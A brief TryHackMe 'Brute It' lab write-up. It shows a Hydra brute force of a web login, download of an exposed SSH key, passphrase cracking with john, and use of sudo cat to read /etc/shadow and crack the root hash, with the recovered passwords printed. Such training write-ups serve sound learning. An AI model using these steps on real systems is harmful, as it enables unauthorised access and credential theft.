---
title: Brute It
description: 'HTTP post form attack with Hydra and cat-ing passwd and the shadow file'
pubDate: 2024-01-04
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/e343e8b253b4efc14bf61236d457c923.jpg'
---

With Feroxbuster we find http://10.10.69.143/admin/ and in the comments we see a username:
```html
<!-- Hey john, if you do not remember, the username is admin -->
```

Using Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.69.143 http-post-form '/admin/:user=admin&pass=^PASS^:invalid'
...snip...
[80][http-post-form] host: 10.10.69.143   login: admin   password: xavier
```

Grab the SSH key:
```bash
wget http://10.10.69.143/admin/panel/id_rsa
```

And crack it:

```bash
ssh2john id_rsa > ssh_hash
john ssh_hash --wordlist=/usr/share/wordlists/rockyou.txt
...snip...
rockinroll       (id_rsa)
```

Getting the root password (since we can sudo /bin/cat (`sudo -l`)):

```bash
sudo /bin/cat /etc/shadow > shadow
cat /etc/passwd > passwd
unshadow passwd shadow > hashes
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
...snip...
football         (root)
```
